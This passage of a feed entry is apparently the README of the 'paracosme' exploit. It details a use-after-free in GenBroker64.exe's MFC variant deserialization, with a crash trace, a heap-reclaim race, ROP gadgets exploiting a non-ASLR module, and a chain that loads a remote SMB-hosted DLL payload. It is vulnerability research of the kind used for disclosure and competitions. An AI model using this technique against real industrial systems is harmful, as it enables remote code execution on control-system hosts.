 case VT_UI8:&#xA;    case VT_FILETIME:&#xA;      return 8;&#xA;    default:&#xA;      return 0;&#xA;  }&#xA;}&#xA;&#xA;void Utils::ReadVariant(tagVARIANT *Variant, Archive_t *Archive, int Level) {&#xA;    TRY {&#xA;        return ReadVariant_((CArchive *)Archive, (COleVariant *)Variant);&#xA;    } CATCH_ALL(e) {&#xA;        VariantClear(Variant);&#xA;    }&#xA;}&#xA;&#xA;HRESULT Utils::ReadVariant_(tagVARIANT *Variant, Archive_t *Archive, int Level) {&#xA;  VARTYPE VarType = Archive.ReadUint16();&#xA;  if((VarType &amp;amp; VT_ARRAY) != 0) {&#xA;      // Special logic to unpack arrays..&#xA;      return ..;&#xA;  }&#xA;&#xA;  Size = VariantTypeToSize(VarType);&#xA;  if (Size) {&#xA;      Variant-&amp;gt;vt = VarType;&#xA;      return Archive.ReadInto(&amp;amp;Variant-&amp;gt;decVal.8, Size);&#xA;  }&#xA;&#xA;  if(!CheckVariantType(VarType)) {&#xA;      // ...&#xA;      throw Something();&#xA;  }&#xA;&#xA;  return Archive &amp;gt;&amp;gt; Variant;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The function implements itself the array unpacking, as well as reading simple variant types but if it is receiving something that isn&#39;t any of those two, it bails out to the &lt;code&gt;operator&amp;gt;&amp;gt;&lt;/code&gt; of the archive instance. This archive instance is an object that is provided by the &lt;a href=&#34;https://docs.microsoft.com/en-us/cpp/mfc/mfc-desktop-applications&#34;&gt;Microsoft Foundation Class&lt;/a&gt; framework that handles serialization &amp;amp; deserialization of various objects. This code is actually open-source and you can find it in &lt;code&gt;C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\atlmfc\src\mfc\olevar.cpp&lt;/code&gt;, but here it is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;CArchive&amp;amp; AFXAPI operator&amp;gt;&amp;gt;(CArchive&amp;amp; ar, COleVariant&amp;amp; varSrc) {&#xA;  LPVARIANT pSrc = &amp;amp;varSrc;&#xA;// ...&#xA;  switch(pSrc-&amp;gt;vt) {&#xA;// ...&#xA;    case VT_DISPATCH:&#xA;    case VT_UNKNOWN: {&#xA;      LPPERSISTSTREAM pPersistStream = NULL;&#xA;      CArchiveStream stm(&amp;amp;ar);&#xA;      CLSID clsid;&#xA;      ar &amp;gt;&amp;gt; clsid.Data1;&#xA;      ar &amp;gt;&amp;gt; clsid.Data2;&#xA;      ar &amp;gt;&amp;gt; clsid.Data3;&#xA;      ar.EnsureRead(&amp;amp;clsid.Data4[0], sizeof clsid.Data4);&#xA;      SCODE sc = CoCreateInstance(clsid, NULL,&#xA;        CLSCTX_ALL | CLSCTX_REMOTE_SERVER,&#xA;        pSrc-&amp;gt;vt == VT_UNKNOWN ? IID_IUnknown : IID_IDispatch,&#xA;        (void**)&amp;amp;pSrc-&amp;gt;punkVal);&#xA;      if(sc == E_INVALIDARG) {&#xA;        sc = CoCreateInstance(clsid, NULL,&#xA;          CLSCTX_ALL &amp;amp; ~CLSCTX_REMOTE_SERVER,&#xA;          pSrc-&amp;gt;vt == VT_UNKNOWN ? IID_IUnknown : IID_IDispatch,&#xA;          (void**)&amp;amp;pSrc-&amp;gt;punkVal);&#xA;      }&#xA;      AfxCheckError(sc);&#xA;      TRY {&#xA;        sc = pSrc-&amp;gt;punkVal-&amp;gt;QueryInterface(&#xA;          IID_IPersistStream, (void**)&amp;amp;pPersistStream);&#xA;        if(FAILED(sc)) {&#xA;          sc = pSrc-&amp;gt;punkVal-&amp;gt;QueryInterface(&#xA;            IID_IPersistStreamInit, (void**)&amp;amp;pPersistStream);&#xA;        }&#xA;        AfxCheckError(sc);&#xA;        AfxCheckError(pPersistStream-&amp;gt;Load(&amp;amp;stm));&#xA;      } CATCH_ALL(e) {&#xA;        if(pPersistStream != NULL) {&#xA;          pPersistStream-&amp;gt;Release();&#xA;        }&#xA;        pSrc-&amp;gt;punkVal-&amp;gt;Release();&#xA;        THROW_LAST();&#xA;      }&#xA;      END_CATCH_ALL&#xA;      pPersistStream-&amp;gt;Release();&#xA;    }&#xA;    return ar;&#xA;  }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The function is mostly boring because it also has logic to unpack trivial types but what caught my attention was the &lt;code&gt;VT_DISPATCH&lt;/code&gt; / &lt;code&gt;VT_UNKNOWN&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;What the hell? You are able to send an arbitrary COM object class ID that implements either &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-ipersiststream&#34;&gt;IPersistStream&lt;/a&gt; or &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/ocidl/nn-ocidl-ipersiststreaminit&#34;&gt;IPersistStreamInit&lt;/a&gt; and it will load it by invoking &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-ipersiststream-load&#34;&gt;IPersistream::Load&lt;/a&gt; to initialize the object. Although this is surprising and a weird feature I didn&#39;t really find this interesting from a security standpoint because I would need to find another bug in a COM object available on stock Windows 10.&lt;/p&gt; &#xA;&lt;p&gt;Now, let&#39;s look closer at the below code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;SCODE sc = CoCreateInstance(clsid, NULL,&#xA;  CLSCTX_ALL | CLSCTX_REMOTE_SERVER,&#xA;  pSrc-&amp;gt;vt == VT_UNKNOWN ? IID_IUnknown : IID_IDispatch,&#xA;  (void**)&amp;amp;pSrc-&amp;gt;punkVal); &amp;lt;-------------- [[0]]&#xA;&#xA;if(sc == E_INVALIDARG) {&#xA;  sc = CoCreateInstance(clsid, NULL,&#xA;    CLSCTX_ALL &amp;amp; ~CLSCTX_REMOTE_SERVER,&#xA;    pSrc-&amp;gt;vt == VT_UNKNOWN ? IID_IUnknown : IID_IDispatch,&#xA;    (void**)&amp;amp;pSrc-&amp;gt;punkVal);&#xA;}&#xA;&#xA;AfxCheckError(sc);&#xA;TRY {&#xA;  sc = pSrc-&amp;gt;punkVal-&amp;gt;QueryInterface(&#xA;    IID_IPersistStream, (void**)&amp;amp;pPersistStream);&#xA;  if(FAILED(sc)) {&#xA;    sc = pSrc-&amp;gt;punkVal-&amp;gt;QueryInterface(&#xA;      IID_IPersistStreamInit, (void**)&amp;amp;pPersistStream);&#xA;  }&#xA;  AfxCheckError(sc);&#xA;  AfxCheckError(pPersistStream-&amp;gt;Load(&amp;amp;stm));&#xA;} CATCH_ALL(e) {&#xA;  if(pPersistStream != NULL) {&#xA;    pPersistStream-&amp;gt;Release();&#xA;  }&#xA;  pSrc-&amp;gt;punkVal-&amp;gt;Release();&#xA;  THROW_LAST();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance&#34;&gt;CoCreateInstance&lt;/a&gt; call writes the COM instance pointer directly in &lt;code&gt;pSrc-&amp;gt;punkVal&lt;/code&gt; which is the resulting variant stored in a caller several frames ahead. Then, if &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-ipersiststream-load&#34;&gt;IStreamPersist::Load&lt;/a&gt; triggers an exception it is caught and &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nf-unknwn-iunknown-release&#34;&gt;IUnknown::Release&lt;/a&gt; is called on both the &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown&#34;&gt;IUnknown&lt;/a&gt; and the &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-ipersiststream&#34;&gt;IPersistStream&lt;/a&gt; interfaces which will free the COM object leaving the &lt;code&gt;pSrc-&amp;gt;punkVal&lt;/code&gt; dangling. The other interesting point is after doing that, the catch block rethrow the exception which gets caught by the below code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void Utils::ReadVariant(tagVARIANT *Variant, Archive_t *Archive, int Level) {&#xA;    TRY {&#xA;        return ReadVariant_((CArchive *)Archive, (COleVariant *)Variant);&#xA;    } CATCH_ALL(e) {&#xA;        VariantClear(Variant);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;At this stage the variant has already been free&#39;d but its type and value haven&#39;t been updated / changed so this &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/oleauto/nf-oleauto-variantclear&#34;&gt;VariantClear&lt;/a&gt; calls trigger a second &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nf-unknwn-iunknown-release&#34;&gt;IUnknown::Release&lt;/a&gt; which yield the below crash:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;First chance exceptions are reported before any exception handling.&#xA;This exception may be expected and handled.&#xA;OLEAUT32!VarWeekdayName+0x22468:&#xA;00007ffa`e620c7f8 488b01          mov     rax,qword ptr [rcx] ds:00000000`2e5a2fd0=????????????????&#xA;&#xA;0:006&amp;gt; kp&#xA; # Child-SP          RetAddr           Call Site&#xA;00 00000000`093bad20 00007ffa`e620cb31 OLEAUT32!VarWeekdayName+0x22468&#xA;01 00000000`093bad50 00000001`4000c20a OLEAUT32!VariantClear+0x21&#xA;02 00000000`093bad80 00007ffa`ccfa10ea GenBroker64+0xc20a&#xA;03 00000000`093badb0 00007ffa`ccfa2ca6 VCRUNTIME140_1+0x10ea&#xA;04 00000000`093bade0 00007ffa`ccfa3ae5 VCRUNTIME140_1!_NLG_Return2+0x1b56&#xA;05 00000000`093baf10 00007ffa`ccfa2258 VCRUNTIME140_1!_NLG_Return2+0x2995&#xA;06 00000000`093baf40 00007ffa`ccfa40e9 VCRUNTIME140_1!_NLG_Return2+0x1108&#xA;07 00000000`093bafe0 00007ffa`e6ce121f VCRUNTIME140_1!_CxxFrameHandler4+0xa9&#xA;08 00000000`093bb050 00007ffa`e6c5d9c2 ntdll!_chkstk+0x19f&#xA;09 00000000`093bb080 00007ffa`ccfa3d82 ntdll!RtlUnwindEx+0x522&#xA;0a 00000000`093bb790 00007ffa`ccfa1635 VCRUNTIME140_1!_NLG_Return2+0x2c32&#xA;0b 00000000`093bb880 00007ffa`ccfa19e6 VCRUNTIME140_1!_NLG_Return2+0x4e5&#xA;0c 00000000`093bb920 00007ffa`ccfa232b VCRUNTIME140_1!_NLG_Return2+0x896&#xA;0d 00000000`093bbaf0 00007ffa`ccfa40e9 VCRUNTIME140_1!_NLG_Return2+0x11db&#xA;0e 00000000`093bbb90 00007ffa`e6ce119f VCRUNTIME140_1!_CxxFrameHandler4+0xa9&#xA;0f 00000000`093bbc00 00007ffa`e6caa229 ntdll!_chkstk+0x11f&#xA;10 00000000`093bbc30 00007ffa`e6cdfe0e ntdll!RtlRaiseException+0x399&#xA;11 00000000`093bc340 00007ffa`e439a839 ntdll!KiUserExceptionDispatcher+0x2e&#xA;12 00000000`093bd080 00007ffa`ccfa2753 KERNELBASE!RaiseException+0x69&#xA;13 00000000`093bd160 00007ffa`e6ce05e6 VCRUNTIME140_1!_NLG_Return2+0x1603&#xA;14 00000000`093bd240 00007ffa`ccc1ab24 ntdll!RtlCaptureContext+0x566&#xA;15 00000000`093bf980 00000001`4001c574 mfc140u+0x27ab24&#xA;16 00000000`093bfa20 00000001`40023241 GenBroker64+0x1c574&#xA;17 00000000`093bfae0 00000001`40025fdc GenBroker64+0x23241&#xA;18 00000000`093bfb40 00000001`4008afee GenBroker64+0x25fdc&#xA;19 00000000`093bfb80 00000001`4008a499 GenBroker64+0x8afee&#xA;1a 00000000`093bfc80 00000001`400858bd GenBroker64+0x8a499&#xA;1b 00000000`093bfda0 00000001`400860a9 GenBroker64+0x858bd&#xA;1c 00000000`093bfe20 00007ffa`e5187bd4 GenBroker64+0x860a9&#xA;1d 00000000`093bff30 00007ffa`e6cace71 KERNEL32!BaseThreadInitThunk+0x14&#xA;1e 00000000`093bff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Woot, pretty awesome, we can trigger the above by instantiating a COM object that implements &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-ipersiststream&#34;&gt;IPersistStream&lt;/a&gt; and have it triggers an exception when &lt;code&gt;Load&lt;/code&gt; is invoked. You can find the trigger code in &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/paracosme-poc.py&#34;&gt;paracosme-poc.py&lt;/a&gt; which should crash the &lt;code&gt;GenBroker64.exe&lt;/code&gt; process on the target. You can also enable page heap on the &lt;code&gt;GenBroker64.exe&lt;/code&gt; to get a crash instantly.&lt;/p&gt; &#xA;&lt;h3&gt;Getting RIP&lt;/h3&gt; &#xA;&lt;p&gt;When &lt;code&gt;VariantClear&lt;/code&gt; is called on the variant, it will dispatch a virtual call to the &lt;code&gt;Release&lt;/code&gt; method to release it. As this is a virtual call, the function reads a vtable and grabs a function pointer at a fixed offset and invokes it. Before this happens, we race the thread to reclaim the &lt;code&gt;ole32!CFileMoniker&lt;/code&gt; instance and replace it with controlled data (see &lt;code&gt;RacerThread_t&lt;/code&gt;). As a result, we control the vtable pointer and are an instruction away from hijacking RIP. The below shows the corresponding assembly instruction where &lt;code&gt;@rcx&lt;/code&gt; points to the chunk we have full control over:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0:011&amp;gt; u . l3&#xA;OLEAUT32!VariantClear+0x20b:&#xA;00007ffb`0df751cb  mov     rax,qword ptr [rcx]&#xA;00007ffb`0df751ce  mov     rax,qword ptr [rax+10h]&#xA;00007ffb`0df751d2  call    qword ptr [00007ffb`0df82660]&#xA;&#xA;0:011&amp;gt; u poi(00007ffb`0df82660)&#xA;OLEAUT32!SetErrorInfo+0xec0:&#xA;00007ffb`0deffd40  jmp     rax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Because we have full control over the reclaimed chunk, we control &lt;code&gt;@rax&lt;/code&gt;. In order to hijack the control flow, we need to set &lt;code&gt;@rax&lt;/code&gt; to a pointer to the value we want to hijack &lt;code&gt;@rip&lt;/code&gt; with. The big issue here is ASLR and we don&#39;t have an information disclosure.&lt;/p&gt; &#xA;&lt;p&gt;Fortunately for us, the module &lt;code&gt;GenBroker64.exe&lt;/code&gt; doesn&#39;t have a dynamic base which means we can use it to find a location that points to an interesting gadget to start our chain.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0:012&amp;gt; !dh genbroker64&#xA;&#xA;File Type: EXECUTABLE IMAGE&#xA;FILE HEADER VALUES&#xA;    8664 machine (X64)&#xA;       7 number of sections&#xA;616D3B07 time date stamp Mon Oct 18 02:14:47 2021&#xA;&#xA;       0 file pointer to symbol table&#xA;       0 number of symbols&#xA;      F0 size of optional header&#xA;      22 characteristics&#xA;            Executable&#xA;            App can handle &amp;gt;2gb addresses&#xA;&#xA;OPTIONAL HEADER VALUES&#xA;            High entropy VA supported&#xA;            NX compatible&#xA;            Terminal server aware&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;ROP&lt;/h3&gt; &#xA;&lt;p&gt;The first gadget that used is a gadget that allows us to fully control &lt;code&gt;@rip&lt;/code&gt; (without any indirection):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0:011&amp;gt; u poi(1400aed18)&#xA;00007ffb2137ffe0   sub     rsp,38h&#xA;00007ffb2137ffe4   test    rcx,rcx&#xA;00007ffb2137ffe7   je      00007ffb`21380015&#xA;00007ffb2137ffe9   cmp     qword ptr [rcx+10h],0&#xA;00007ffb2137ffee   jne     00007ffb`2137fff4&#xA; ...&#xA;00007ffb2137fff4   and     qword ptr [rsp+40h],0&#xA;00007ffb2137fffa   mov     rax,qword ptr [rcx+10h]&#xA;00007ffb2137fffe   call    qword ptr [mfc140u!__guard_dispatch_icall_fptr (00007ffb`21415b60)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can place the address of the next gadget at offset &lt;code&gt;+0x10&lt;/code&gt; in the chunk we reclaim (pointed by &lt;code&gt;@rcx&lt;/code&gt;) which is great.&lt;/p&gt; &#xA;&lt;p&gt;The second gadget we use pivots the stack to the reclaimed heap chunk we have full control over:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0:008&amp;gt; u 14005bd25&#xA;000000014005bd25   mov     esp,ecx&#xA;000000014005bd27   cmp     byte ptr [1400fe788],0&#xA;000000014005bd2e   je      000000014005bebc&#xA;...&#xA;000000014005bebc   lea     r11,[rsp+60h]&#xA;000000014005bec1   mov     rbx,qword ptr [r11+30h]&#xA;000000014005bec5   mov     rbp,qword ptr [r11+38h]&#xA;000000014005bec9   mov     rsi,qword ptr [r11+40h]&#xA;000000014005becd   mov     rsp,r11&#xA;000000014005bed0   pop     r15&#xA;000000014005bed2   pop     r14&#xA;000000014005bed4   pop     r13&#xA;000000014005bed6   pop     r12&#xA;000000014005bed8   pop     rdi&#xA;000000014005bed9   ret&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Funny thing is that the address of our heap chunk seems to be located (always?) in a location that fits in a 32-bit integer and that is why &lt;code&gt;mov esp, ecx&lt;/code&gt; works fine.&lt;/p&gt; &#xA;&lt;p&gt;At this point we have ROP but we don&#39;t have a whole lot of space which was pretty frustrating. I spent a bunch of time trying to align the stars and eventually came up with a sequence of gadgets that invokes &lt;code&gt;LoadLibraryW&lt;/code&gt; with a remote SMB path pointing to a DLL file that hosts our payload. If you are interested in the details of the chain, check out &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/paracosme.py&#34;&gt;paracosme.py@241&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Authors&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Axel &#39;&lt;a href=&#34;https://twitter.com/0vercl0k&#34;&gt;0vercl0k&lt;/a&gt;&#39; Souchet&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>